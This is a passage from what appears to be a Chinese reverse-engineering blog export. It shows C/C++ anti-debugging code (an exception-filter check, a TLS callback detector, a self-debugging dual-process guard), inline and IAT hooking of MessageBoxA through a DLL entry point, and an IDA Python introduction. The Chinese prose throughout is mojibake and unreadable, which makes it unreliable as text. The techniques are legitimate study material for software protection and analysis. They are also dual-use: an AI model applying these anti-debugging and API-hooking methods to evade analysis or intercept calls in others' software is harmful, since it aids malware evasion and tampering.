¹æ®ä¸åŒçš„ç»“æœæ‰§è¡Œä¸åŒçš„æ“ä½œï¼Œè¿™å°±æ˜¯åˆ©ç”¨å¼‚å¸¸å¤„ç†æœºåˆ¶ä¸åŒçš„åè°ƒè¯•åŸç†ã€‚ å¸¸è§çš„å¼‚å¸¸æœ‰ï¼šhttps://msdn.microsoft.com/zh-tw/library/aa915076.aspx å¦‚æœä¸€ä¸ªå¼‚å¸¸å‘ç”Ÿè€Œæ²¡æœ‰æ³¨å†Œå¼‚å¸¸å¤„ç†ç¨‹åºï¼ˆæˆ–è€…å·²ç»æ³¨å†Œä½†æ²¡æœ‰å¤„ç†è¿™æ ·çš„å¼‚å¸¸ï¼‰ï¼Œkernel32!UnhandledExceptionFilter()å‡½æ•°å°†è¢«è°ƒç”¨ã€‚å¯ä»¥ä½¿ç”¨kernel32!SetUnhandledExceptionFilter()æ¥æ³¨å†Œä¸€ä¸ªè‡ªå®šä¹‰çš„æœªå¤„ç†å¼‚å¸¸è¿‡æ»¤å™¨ã€‚ä½†æ˜¯å¦‚æœç¨‹åºåœ¨è°ƒè¯•å™¨ä¸‹è¿è¡Œï¼Œè‡ªå®šä¹‰çš„è¿‡æ»¤å™¨å°†ä¸ä¼šè¢«è°ƒç”¨ï¼Œå¼‚å¸¸å°†è¢«ä¼ é€’ç»™è°ƒè¯•å™¨ã€‚å› æ­¤ï¼Œå¦‚æœæœªå¤„ç†çš„å¼‚å¸¸è¿‡æ»¤å™¨è¢«æ³¨å†Œï¼Œå¹¶ä¸”æ§åˆ¶è¢«ä¼ é€’ç»™å®ƒï¼Œé‚£ä¹ˆè¿™ä¸ªè¿›ç¨‹å°±ä¸æ˜¯åœ¨è°ƒè¯•å™¨ä¸‹è¿è¡Œã€‚ å¤„ç†æ–¹æ³•å¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« ï¼šhttps://www.52pojie.cn/thread-933123-1-1.html 123456789101112131415161718192021LONG UnhandledExceptionFilter(PEXCEPTION_POINTERS pExceptionInfo)&#123; PCONTEXT ctx = pExceptionInfo-&gt;ContextRecord; ctx-&gt;Eip += 3; // Skip \\xCC\\xEB\\ return EXCEPTION_CONTINUE_EXECUTION;&#125; bool Check()&#123; bool bDebugged = true; SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)UnhandledExceptionFilter); __asm &#123; int 3 jmp near being_debugged &#125; bDebugged = false; being_debugged: return bDebugged;&#125; TLSå›è°ƒå‡½æ•°TLS å›è°ƒå‡½æ•°ä¸ºå¼€å‘è€…æä¾›äº†ä¸€ç§çµæ´»çš„æœºåˆ¶ï¼Œå¯ä»¥åœ¨ç¨‹åºåŠ è½½æ—¶æˆ–è€…çº¿ç¨‹åˆ›å»ºæ—¶æ‰§è¡Œç‰¹å®šçš„æ“ä½œï¼Œç”¨äºåˆå§‹åŒ–ã€èµ„æºç®¡ç†ã€å¼‚å¸¸å¤„ç†ç­‰æ–¹é¢åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­ï¼ŒTLSå›è°ƒå‡½æ•°æ˜¯é€šè¿‡TLSå›è°ƒè¡¨æ¥ç®¡ç†çš„ã€‚è¿™äº›å›è°ƒå‡½æ•°é€šå¸¸åœ¨DLLæ–‡ä»¶ä¸­å®ç°ï¼Œå¹¶é€šè¿‡åŠ¨æ€é“¾æ¥åº“ï¼ˆDLLï¼‰çš„å…¥å£ç‚¹DllMainå‡½æ•°è¿›è¡Œæ³¨å†Œã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &quot;stdafx.h&quot;#include &lt;stdio.h&gt;#include &lt;windows.h&gt; void NTAPI __stdcall TLS_CALLBACK1(PVOID DllHandle, DWORD dwReason, PVOID Reserved); #ifdef _M_IX86#pragma comment (linker, &quot;/INCLUDE:__tls_used&quot;)#pragma comment (linker, &quot;/INCLUDE:__tls_callback&quot;)#else#pragma comment (linker, &quot;/INCLUDE:_tls_used&quot;)#pragma comment (linker, &quot;/INCLUDE:_tls_callback&quot;)#endifEXTERN_C#ifdef _M_X64#pragma const_seg (&quot;.CRT$XLB&quot;)const#else#pragma data_seg (&quot;.CRT$XLB&quot;)#endif PIMAGE_TLS_CALLBACK _tls_callback[] = &#123; TLS_CALLBACK1,0&#125;;#pragma data_seg ()#pragma const_seg () #include &lt;iostream&gt; void NTAPI __stdcall TLS_CALLBACK1(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123; if (IsDebuggerPresent()) &#123; printf(&quot;TLS_CALLBACK: Debugger Detected!\\n&quot;); &#125; else &#123; printf(&quot;TLS_CALLBACK: No Debugger Present!\\n&quot;); &#125;&#125; int main(int argc, char* argv[])&#123; printf(&quot;233\\n&quot;); return 0;&#125; ç”±æ“ä½œç³»ç»Ÿæˆ–è€…è¿è¡Œæ—¶åº“ï¼ˆå¦‚ C è¿è¡Œæ—¶åº“ï¼‰æ‰€å¯åŠ¨çš„ä¸€äº›çº¿ç¨‹ï¼Œç”¨äºæ‰§è¡Œä¸€äº›åˆå§‹åŒ–æˆ–å…¶ä»–ä»»åŠ¡ã€‚åœ¨è¿™äº›çº¿ç¨‹ä¸­ï¼ŒTLS å›è°ƒå‡½æ•°ä¼šå…ˆäºmainå‡½æ•°è°ƒç”¨ã€‚ è¦åœ¨ç¨‹åºä¸­ä½¿ç”¨TLSï¼Œå¿…é¡»ä¸ºTLSæ•°æ®å•ç‹¬å»ºä¸€ä¸ªæ•°æ®æ®µï¼Œç”¨ç›¸å…³æ•°æ®å¡«å……æ­¤æ®µï¼Œå¹¶é€šçŸ¥é“¾æ¥å™¨ä¸ºTLSæ•°æ®åœ¨PEæ–‡ä»¶å¤´ä¸­æ·»åŠ æ•°æ®ã€‚_tls_callback[]æ•°ç»„ä¸­ä¿å­˜äº†æ‰€æœ‰çš„TLSå›è°ƒå‡½æ•°æŒ‡é’ˆã€‚æ•°ç»„å¿…é¡»ä»¥NULLæŒ‡é’ˆç»“æŸï¼Œä¸”æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå›è°ƒå‡½æ•°åœ¨ç¨‹åºåˆå§‹åŒ–æ—¶éƒ½ä¼šè¢«è°ƒç”¨ï¼Œç¨‹åºå‘˜å¯æŒ‰éœ€è¦æ·»åŠ ã€‚ä½†ç¨‹åºå‘˜ä¸åº”å½“å‡è®¾æ“ä½œç³»ç»Ÿå·²ä½•ç§é¡ºåºè°ƒç”¨å›è°ƒå‡½æ•°ã€‚å¦‚æ­¤åˆ™è¦æ±‚åœ¨TLSå›è°ƒå‡½æ•°ä¸­è¿›è¡Œåè°ƒè¯•æ“ä½œéœ€è¦ä¸€å®šçš„ç‹¬ç«‹æ€§ã€‚ è¿™ä¸ªç¨‹åºå°±ä¼šå¤šå‡ºæ¥ä¸€ä¸ª.tlsæ®µ åŒè¿›ç¨‹å®ˆæŠ¤ä¸€ä¸ªè¿›ç¨‹åªèƒ½è¢«è°ƒè¯•å™¨é™„åŠ ä¸€æ¬¡ã€‚åˆ©ç”¨è¿™ä¸€ç‚¹å¯ä»¥è‡ªå·±å…ˆè°ƒè¯•è¿è¡Œè‡ªå·±ï¼Œé˜²æ­¢è¢«å¦ä¸€ä¸ªè°ƒè¯•å™¨ç»§ç»­è°ƒè¯•ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &quot;windows.h&quot; int DebugMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow); int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)&#123; if(!IsDebuggerPresent()) //åŒºåˆ†è°ƒè¯•è¿›ç¨‹ä¸è¢«è°ƒè¯•è¿›ç¨‹ï¼Œä»¥æ‰§è¡Œä¸åŒçš„ä»£ç ã€‚ &#123; return DebugMain(hInstance,hPrevInstance,lpCmdLine,nCmdShow); &#125; __asm(&quot;int $3&quot;); MessageBox(0,&quot;è¿™æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­&quot;,&quot;TraceMe&quot;,0); return 0;&#125; int DebugMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow) //è°ƒè¯•è¿›ç¨‹ä¸»å‡½æ•°&#123; char filename[MAX_PATH]; GetModuleFileName(0,filename,MAX_PATH); //è·å–è‡ªèº«æ–‡ä»¶å STARTUPINFO si=&#123;0&#125;; GetStartupInfo(&amp;si); PROCESS_INFORMATION pi=&#123;0&#125;; if(!CreateProcess(filename,NULL,NULL,NULL,FALSE,DEBUG_PROCESS|DEBUG_ONLY_THIS_PROCESS,NULL,NULL,&amp;si,&amp;pi)) //åˆ›å»ºè¢«è°ƒè¯•è¿›ç¨‹ &#123; return 0; &#125; BOOL WhileDoFlag=TRUE; DEBUG_EVENT DBEvent ; DWORD dwState; while (WhileDoFlag) &#123; WaitForDebugEvent (&amp;DBEvent, INFINITE); dwState = DBG_EXCEPTION_NOT_HANDLED ; switch (DBEvent.dwDebugEventCode) &#123; case CREATE_PROCESS_DEBUG_EVENT: dwState = DBG_CONTINUE ; break; case EXIT_PROCESS_DEBUG_EVENT : WhileDoFlag=FALSE; break ; case EXCEPTION_DEBUG_EVENT: switch (DBEvent.u.Exception.ExceptionRecord.ExceptionCode) &#123; case EXCEPTION_BREAKPOINT: &#123; dwState = DBG_CONTINUE ; break; &#125; &#125; break; &#125; ContinueDebugEvent(pi.dwProcessId, pi.dwThreadId, dwState) ; &#125; CloseHandle(pi.hProcess) ; CloseHandle(pi.hThread) ; return 0;&#125; åˆ›å»ºå‡ºä¸¤ä¸ªä¸€æ ·çš„è¿›ç¨‹ï¼Œåªä¸è¿‡ä¸€ä¸ªä½œä¸ºè°ƒè¯•å™¨ï¼Œä¸€ä¸ªä½œä¸ºè¢«è°ƒè¯•è¿›ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨å¼‚å¸¸æ¥è¿›è¡Œæ§åˆ¶ç¨‹åºæ‰§è¡Œã€‚","categories":[{"name":"ä»£ç ä¿æŠ¤","slug":"ä»£ç ä¿æŠ¤","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4/"}],"tags":[]},{"title":"PE--Hook","slug":"Hookæ–¹æ³•","date":"2022-09-11T16:00:00.000Z","updated":"2024-05-12T13:21:28.934Z","comments":true,"path":"2022/09/12/Hookæ–¹æ³•/","permalink":"https://e1ectr0nlc.github.io/2022/09/12/Hook%E6%96%B9%E6%B3%95/","excerpt":"Hookå„ç§APIå‡½æ•°å®ç°è‡ªå·±çš„åŠŸèƒ½","text":"Hookå„ç§APIå‡½æ•°å®ç°è‡ªå·±çš„åŠŸèƒ½ Inline Hookå®ç°åŸç†å®ç°Inline Hookå¯ä»¥ç†è§£ä¸ºä¿®æ”¹ç¨‹åºçš„æ‰§è¡Œæµï¼Œåˆ°å¦å¤–ä¸€å—å†…å­˜ä¸­æ‰§è¡Œæˆ‘ä»¬éœ€è¦çš„æ“ä½œï¼Œç»“æŸä¹‹åè¿”å›åˆ°åŸæ¥çš„åœ°æ–¹æ¥ç€æ‰§è¡Œç¨‹åºåŸæœ¬çš„æ“ä½œã€‚åœ¨è¿™é‡Œéœ€è¦è€ƒè™‘çš„é—®é¢˜æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š å¦‚ä½•æ‰¾åˆ°è·³è½¬çš„åœ°å€ï¼› å¦‚ä½•ä¿æŠ¤ç°åœºä»¥åŠè¿˜åŸæ‰§è¡Œæµï¼› å¦‚æœå†…å­˜é¡µä¸å¯å†™å¦‚ä½•è§£å†³ã€‚ ä»£ç ç¼–å†™æ€è·¯ä½¿ç”¨JMPæŒ‡ä»¤æ¥è¿›è¡Œè·³è½¬æ“ä½œï¼ˆæ— æ¡ä»¶è·³è½¬å°±æ˜¯å¥½ç”¨ï¼‰ã€‚ä½†æ˜¯JMPåçš„åœ°å€ï¼ˆæ“ä½œæ•°ï¼‰å¦‚ä½•å¯»æ‰¾ï¼Ÿ JMPçš„ç›®æ ‡åœ°å€æ˜¯ç›¸å¯¹äºä¸‹ä¸€æ¡æŒ‡ä»¤çš„ä½ç½®è¿›è¡Œè®¡ç®—ï¼Œè®¡ç®—å…¬å¼ä¸ºï¼šJMP åé¢çš„åœ°å€ï¼ˆæ“ä½œæ•°ï¼‰ &#x3D; ç›®çš„åœ°å€ - æºåœ°å€ - 5ã€‚å…¶ä¸­ï¼Œ5 æ˜¯ JMP æŒ‡ä»¤çš„å­—èŠ‚æ•°ã€‚ æ¥ç€è€ƒè™‘è¿˜åŸå‡½æ•°çš„åœ°å€ï¼Œæˆ‘ä»¬JMPåˆ°è‡ªå®šä¹‰å‡½æ•°åï¼Œæ‰§è¡Œå®Œè‡ªå®šä¹‰å‡½æ•°çš„å†…å®¹ï¼Œæ¥ç€å°±éœ€è¦è¿˜åŸæ‰§è¡Œæµæ¢å¤åˆ°åŸå‡½æ•°ä¸­ã€‚è¿˜åŸåœ°å€ &#x3D; è·å–ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼ˆåŸå‡½æ•°åœ°å€+5ï¼‰ - åˆ†é…åˆ°çš„å†…å­˜çš„åœ°å€ - æŒ‡ä»¤é•¿åº¦ï¼ˆ5ï¼‰ ä»£ç å®ç°ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;iostream&gt;// ç”¨äºè·³è½¬åˆ°MyMessageBoxAçš„æŒ‡ä»¤ï¼Œ0xE9ä»£è¡¨JMPæŒ‡ä»¤BYTE JmpOriginal[5] = &#123; 0xE9, 0, 0, 0, 0 &#125;; // å­˜å‚¨åŸå§‹MessageBoxAçš„å‰5ä¸ªå­—èŠ‚BYTE OldCode[5] = &#123; 0 &#125;; // MessageBoxAçš„å‡½æ•°åœ°å€FARPROC MessageBoxAddress;// è¿˜åŸå‡½æ•°åœ°å€void* Trampoline; // è‡ªå®šä¹‰çš„MessageBoxAå‡½æ•°int WINAPI MyMessageBoxA(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)&#123; printf(&quot;MessageBoxA å·²ç»è¢«Hook\\n&quot;); // æ‰“å°è¢«Hookçš„ä¿¡æ¯ // è¿”å›åŸå‡½æ•°è°ƒç”¨åŸå§‹çš„MessageBoxAï¼Œè¿™é‡Œéœ€è¦ç±»å‹è½¬æ¢ int ret = ((int (WINAPI*)(HWND, LPCTSTR, LPCTSTR, UINT))Trampoline)(hWnd, lpText, lpCaption, uType); return ret;&#125;void InlineHook()&#123; // åŠ è½½user32.dllæ¨¡å— HMODULE hModule_User32 = LoadLibraryA(&quot;user32.dll&quot;); // è·å–MessageBoxAçš„å‡½æ•°åœ°å€ MessageBoxAddress = GetProcAddress(hModule_User32, &quot;MessageBoxA&quot;); // è®¡ç®—è·³è½¬åˆ°è‡ªå®šä¹‰å‡½æ•°çš„åœ°å€ DWORD JmpAddress = (DWORD)MyMessageBoxA - (DWORD)MessageBoxAddress - 5; // å°†è·³è½¬åœ°å€å¤åˆ¶åˆ°JmpOriginalçš„ç¬¬äºŒä¸ªå­—èŠ‚ memcpy(&amp;JmpOriginal[1], &amp;JmpAddress, 4); // è¯»å–å¹¶ä¿å­˜MessageBoxAçš„å‰5ä¸ªå­—èŠ‚ ReadProcessMemory(GetCurrentProcess(), MessageBoxAddress, OldCode, 5, NULL); // åˆ†é…10ä¸ªå­—èŠ‚çš„å†…å­˜ç©ºé—´ç”¨æ¥æ”¾å…¥è·³è½¬å›åŸå‡½æ•°çš„æŒ‡ä»¤ Trampoline = VirtualAlloc(NULL, 10, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // å¤åˆ¶MessageBoxAçš„å‰5ä¸ªå­—èŠ‚ memcpy(Trampoline, OldCode, 5); // è®¡ç®—è¿˜åŸå‡½æ•°çš„åœ°å€ï¼ˆåŸå‡½æ•°åœ°å€+5è·å–ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€å-åˆ†é…å†…å­˜çš„åœ°å€-æŒ‡ä»¤é•¿åº¦ï¼‰ DWORD jmpBackAddr = (DWORD)MessageBoxAddress + 5 - (DWORD)Trampoline - 5; // JMP memcpy((void*)((DWORD)Trampoline + 5), &amp;JmpOriginal[0], 5); // MessageBoxA å‡½æ•°ä¸­çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ã€‚ memcpy((void*)((DWORD)Trampoline + 6), &amp;jmpBackAddr, 4); DWORD dwOldProtect; // ä¿®æ”¹MessageBoxAçš„å‰5ä¸ªå­—èŠ‚çš„é¡µå±æ€§ï¼Œä½¿å…¶å¯è¯»å¯å†™å¯æ‰§è¡Œ VirtualProtect(MessageBoxAddress, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); // æ›¿æ¢MessageBoxAçš„å‰5ä¸ªå­—èŠ‚ä¸ºè·³è½¬åˆ°MyMessageBoxAçš„æŒ‡ä»¤ WriteProcessMemory(GetCurrentProcess(), MessageBoxAddress, &amp;JmpOriginal[0], 5, NULL); // æ¢å¤MessageBoxAçš„å‰5ä¸ªå­—èŠ‚çš„åŸå§‹é¡µå±æ€§ VirtualProtect(MessageBoxAddress, 5, dwOldProtect, &amp;dwOldProtect);&#125;void main()&#123; InlineHook(); // å®æ–½Inline Hook MessageBoxA(NULL, &quot;Hello World&quot;, &quot;Title&quot;, MB_OK); // è°ƒç”¨MessageBoxAå‡½æ•°&#125; å¤§æ¦‚æµç¨‹å°±æ˜¯å°†MessageBoxAçš„åœ°å€å…ˆé€šè¿‡WriteProcessMemoryæ”¹ä¸ºè‡ªå®šä¹‰å‡½æ•°çš„åœ°å€ï¼ŒåŒæ—¶å¼€è¾Ÿç©ºé—´å†™å…¥åŸå‡½æ•°çš„ç¬¬ä¸€æ¡æŒ‡ä»¤å’Œè·³è½¬å›åŸå‡½æ•°çš„åœ°å€æŒ‡ä»¤ï¼Œæ¥ç€ç­‰åˆ°è‡ªå®šä¹‰å‡½æ•°æ‰§è¡Œç»“æŸåä½œä¸ºå‡½æ•°æŒ‡é’ˆè°ƒç”¨åŸå‡½æ•°ã€‚ IAT Hookå®ç°åŸç†æ€è·¯ä¸Inline Hookå¤§åŒå°å¼‚ã€‚åœ¨Inline Hookä¸­ï¼Œæˆ‘ä»¬å…³æ³¨çš„æ˜¯JMPè·³è½¬åå†è·³è½¬å›å»ï¼Œè€Œåœ¨IAT Hookä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦å…³æ³¨å¦‚ä½•å°†è‡ªå®šä¹‰å‡½æ•°åœ°å€æ›¿æ¢IATå‡½æ•°åœ°å€å³å¯ï¼Œä¸éœ€è¦è‡ªå·±æ¥å®ç°è·³æ¥è·³å»ã€‚é…åˆä¸€äº›DLLæ³¨å…¥æŠ€æœ¯ï¼Œå°±å¯ä»¥è¾¾åˆ°ä»»æ„APIå‡½æ•°Hookäº†ã€‚ ä»£ç ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162// dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚&quot;#include &lt;windows.h&gt;//åˆ›å»ºä¸Messageboxç›¸åŒçš„å‡½æ•°æŒ‡é’ˆ,æ³¨æ„è¦è®¾ç½®ç›¸åŒçš„å‡½æ•°å‚æ•°typedef int (WINAPI *PfnMsgA)( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType);PfnMsgA g_OldPfnMsgA = nullptr; //å®šä¹‰ä¸€ä¸ªæŒ‡å‘åŸå…ˆmessageboxå‡½æ•°çš„ç©ºæŒ‡é’ˆ(nullptr)//è§£æPEæ–‡ä»¶ç»“æ„//è·å–å½“å‰çš„ImagBase(åŸºå€)HMODULE hModImageBase = GetModuleHandle(NULL);//è·å–DOSå¤´PIMAGE_DOS_HEADER pDosHead = (PIMAGE_DOS_HEADER)(DWORD)hModImageBase; //è·å–NTå¤´DWORD dwTemp = (DWORD)pDosHead + (DWORD)pDosHead-&gt;e_lfanew;PIMAGE_NT_HEADERS pNtHead = (PIMAGE_NT_HEADERS)dwTemp; //è·å–æ ‡å‡†PEå¤´PIMAGE_FILE_HEADER pFileHead = (PIMAGE_FILE_HEADER)&amp; pNtHead-&gt;FileHeader; //è·å–æ‰©å±•PEå¤´PIMAGE_OPTIONAL_HEADER pOptHead = (PIMAGE_OPTIONAL_HEADER)&amp; pNtHead-&gt;OptionalHeader;//æ‰¾åˆ°å¯¼å…¥è¡¨çš„åç§»(RVA)DWORD dwExportLocal=pOptHead-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;//è·å–å¯¼å…¥è¡¨PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)GetModuleHandle(NULL) + dwExportLocal); //å®šä¹‰è‡ªå·±è®¾ç½®çš„Messageboxå‡½æ•°int WINAPI MyMessageBox(_In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType)&#123; char szHookText[] = &quot;HookæˆåŠŸ&quot;; if (g_OldPfnMsgA != nullptr) &#123; //è°ƒç”¨åŸå‡½æ•° return g_OldPfnMsgA(hWnd, szHookText, lpCaption, uType); &#125; return 0;&#125;//è®¾ç½®IATHookvoid SetIatHook()&#123; MessageBoxA(NULL, &quot;å¼€å§‹è¿›è¡ŒHOOK&quot;, NULL, NULL); //å®šä¹‰ä¸€ä¸ªæŒ‡å‘hookåœ°å€çš„ç©ºæŒ‡é’ˆ PVOID pHookAddress = nullptr; //å°†è¦hookçš„åœ°å€æŒ‡å‘Messageboxå‡½æ•° pHookAddress = GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;), &quot;MessageBoxA&quot;); if (nullptr == pHookAddress) &#123; OutputDebugString(TEXT(&quot;è·å–å‡½æ•°åœ°å€å¤±è´¥&quot;)); MessageBoxA(NULL, &quot;è·å–å‡½æ•°åœ°å€å¤±è´¥HOOK&quot;, NULL, NULL); return; &#125; //æŒ‡å‘æ—§å‡½æ•°çš„æŒ‡é’ˆ g_OldPfnMsgA = (PfnMsgA)pHookAddress; //å¯»æ‰¾IATè¡¨çš„ä½ç½®. PIMAGE_IMPORT_DESCRIPTOR pCurrent = pImport; //å¯¼å…¥è¡¨çš„å­è¡¨,ä¹Ÿå°±æ˜¯IATå­˜å‚¨å‡½æ•°åœ°å€çš„è¡¨ DWORD *pFirstThunk; //éå†å¯¼å…¥è¡¨ while (pCurrent-&gt;Characteristics &amp;&amp; pCurrent-&gt;FirstThunk != NULL) &#123; //æ‰¾åˆ°IATè¡¨çš„åç§»åœ°å€ dwTemp = pCurrent-&gt;FirstThunk + (DWORD)GetModuleHandle(NULL); //æŒ‡å‘IATè¡¨çš„æŒ‡é’ˆ pFirstThunk = (DWORD *)dwTemp; while (*pFirstThunk != NULL) &#123; //éå†IATè¡¨é‡Œçš„å­è¡¨,è‹¥æŒ‡é’ˆæŒ‡å‘çš„æ˜¯æ—§å‡½æ•°çš„åœ°å€,åˆ™å°†å…¶ä¿®æ”¹æˆæˆ‘ä»¬çš„å‡½æ•°åœ°å€ if (*pFirstThunk == (DWORD)g_OldPfnMsgA) &#123; DWORD oldProtected; //è®¾ç½®è¯¥å†…å­˜åŒºåŸŸå±æ€§ä¸ºå¯å†™å¯è¯»å¯æ‰§è¡Œ VirtualProtect(pFirstThunk, 0x1000, PAGE_EXECUTE_READWRITE, &amp;oldProtected); //å°†æ—§å‡½æ•°åœ°å€ä¿®æ”¹æˆè‡ªå·±çš„å‡½æ•°åœ°å€ dwTemp = (DWORD)MyMessageBox; memcpy(pFirstThunk, (DWORD *)&amp;dwTemp, 4); //è¿˜åŸä¿æŠ¤å±æ€§ VirtualProtect(pFirstThunk, 0x1000, oldProtected, &amp;oldProtected); &#125; //éå†IATè¡¨ pFirstThunk++; &#125; //éå†å¯¼å…¥è¡¨ pCurrent++; &#125;&#125;//æ¢å¤å¯¼å…¥è¡¨void UnIatHook()&#123; MessageBoxA(NULL, &quot;å¼€å§‹è¿›è¡ŒHOOK&quot;, NULL, NULL); PVOID pHookAddress = nullptr; pHookAddress = MyMessageBox; if (nullptr == pHookAddress) &#123; OutputDebugString(TEXT(&quot;è·å–å‡½æ•°åœ°å€å¤±è´¥&quot;)); MessageBoxA(NULL, &quot;æ¢å¤å‡½æ•°åœ°å€å¤±è´¥HOOK&quot;, NULL, NULL); return; &#125; PIMAGE_IMPORT_DESCRIPTOR pCurrent = pImport; DWORD* pFirstThunk; //æŒ‡å‘ //éå†å¯¼å…¥è¡¨ while (pCurrent-&gt;Characteristics &amp;&amp; pCurrent-&gt;FirstThunk != NULL) &#123; dwTemp = pCurrent-&gt;FirstThunk + (DWORD)GetModuleHandle(NULL); pFirstThunk = (DWORD*)dwTemp; //éå†å­è¡¨ while (*pFirstThunk != NULL) &#123; //å¦‚æœæ˜¯æˆ‘ä»¬çš„å‡½æ•°åœ°å€ if (*pFirstThunk == (DWORD)MyMessageBox) &#123; //æ‰¾åˆ°è¦ä¿®æ”¹çš„å¯¼å…¥è¡¨äº†ï¼Œä¿®æ”¹å†…å­˜ä¿æŠ¤å±æ€§.å†™å…¥æˆ‘ä»¬æ–°çš„å‡½æ•°åœ°å€. DWORD oldProtected; VirtualProtect(pFirstThunk, 0x1000, PAGE_EXECUTE_READWRITE, &amp;oldProtected); dwTemp = (DWORD)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;), &quot;MessageBoxA&quot;); memcpy(pFirstThunk, (DWORD*)&amp; dwTemp, 4); //å°†å˜é‡ä¸­ä¿å­˜çš„å‡½æ•°åœ°å€æ‹·è´åˆ°å¯¼å…¥è¡¨ä¸­. VirtualProtect(pFirstThunk, 0x1000, oldProtected, &amp;oldProtected); &#125; pFirstThunk++; //ç»§ç»­éå†. &#125; pCurrent++; //æ¯æ¬¡æ˜¯åŠ ä¸€ä¸ªå¯¼å…¥è¡¨ç»“æ„. &#125;&#125;BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: SetIatHook(); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;","categories":[{"name":"Hookæ¡†æ¶","slug":"Hookæ¡†æ¶","permalink":"https://e1ectr0nlc.github.io/categories/Hook%E6%A1%86%E6%9E%B6/"}],"tags":[]},{"title":"IDA pythonç¼–å†™","slug":"IDA-pythonç¼–å†™","date":"2022-08-11T16:00:00.000Z","updated":"2024-05-13T12:20:08.830Z","comments":true,"path":"2022/08/12/IDA-pythonç¼–å†™/","permalink":"https://e1ectr0nlc.github.io/2022/08/12/IDA-python%E7%BC%96%E5%86%99/","excerpt":"tå¬å­¦é•¿è¯´IDA pythonå¾ˆæœ‰ç”¨ï¼Œä»Šå¤©å°±æ¥æŠ½ç©ºå­¦ä¹ ä¸€ä¸‹ã€‚","text":"tå¬å­¦é•¿è¯´IDA pythonå¾ˆæœ‰ç”¨ï¼Œä»Šå¤©å°±æ¥æŠ½ç©ºå­¦ä¹ ä¸€ä¸‹ã€‚ ç¯å¢ƒä¾‹å­ä¸‹è½½ï¼š[jocker.exe](https://buuoj.cn/challenges#[ç½‘é¼æ¯ 2020 é’é¾™ç»„]) å·¥å…· ç‰ˆæœ¬ python 3.11.3 ida pro 7.7 IDA pythonä»‹ç»IDAåœ¨7.5ç‰ˆæœ¬æ›´æ–°åæ”¯æŒpython3ï¼ŒåŸæ¥çš„å¾ˆå¤šå‡½æ•°éƒ½æœ‰äº†æ”¹å˜ï¼Œæ¥ä¸‹æ¥å°±æ¥ä»‹ç»ä¸€ä¸‹æ”¹å˜å‰åçš„å‡½æ•°ä»¥åŠå®ƒçš„ä½œç”¨ã€‚ è·å–åœ°å€ å‡½æ•°ä½œç”¨ å‡½æ•° è·å–å…‰æ ‡å½“å‰åœ°å€ idc.here() æˆ– idc.get_screen_ea() è·å–æœ€å°åœ°å€ï¼ˆå¯ä»¥ä½¿ç”¨çš„ï¼‰ ida_ida.inf_get_min_ea() è·å–æœ€å¤§åœ°å€ï¼ˆå¯ä»¥ä½¿ç”¨çš„ï¼‰ ida_ida.inf_get_max_ea() è·å–æ‰€é€‰èŒƒå›´çš„èµ·å§‹åœ°å€ idc.read_selection_start() è·å–æ‰€é€‰èŒƒå›´çš„ç»“æŸåœ°å€ idc.read_selection_end() åˆ¤æ–­åœ°å€æ˜¯å¦å­˜åœ¨ idaapi.BADADDR è¿™äº›å‡½æ•°éƒ½ä¸éœ€è¦å‚æ•° ä»£ç å¦‚ä¸‹ï¼Œæˆ‘é€‰ä¸­çš„åŒºåŸŸå°±æ˜¯éƒ¨åˆ†mainå‡½æ•° 12345678910print(hex(idc.here()))print(hex(ida_ida.inf_get_max_ea()))print(hex(ida_ida.inf_get_min_ea()))print(hex(idc.read_selection_start()))print(hex(idc.read_selection_end())) if idc.here() == idaapi.BADADDR: print(&quot;ä¸å­˜åœ¨&quot;)else: print(&quot;å­˜åœ¨&quot;) note warning æ³¨æ„ ä½¿ç”¨idc.read_selection_start()å’Œidc.read_selection_end()æ˜¯éœ€è¦ä½¿ç”¨å…‰æ 